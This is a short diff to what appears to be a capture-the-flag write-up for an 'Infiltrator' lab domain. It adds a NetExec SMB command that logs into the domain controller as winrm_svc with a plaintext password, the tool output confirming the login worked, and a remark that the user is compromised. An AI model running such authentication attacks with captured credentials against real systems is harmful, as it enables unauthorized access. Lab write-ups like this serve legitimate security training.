@@ -801,8 +801,14 @@ winrm_svc:WinRm@$svc^!^P
 ```
 
 ```python
-
+nxc smb dc01.infiltrator.htb -u winrm_svc -p 'WinRm@$svc^!^P'                        
+SMB         10.129.68.136   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.68.136   445    DC01             [+] infiltrator.htb\winrm_svc:WinRm@$svc^!^P
 ```
+
+This user is compromised
+
+
 
 
 
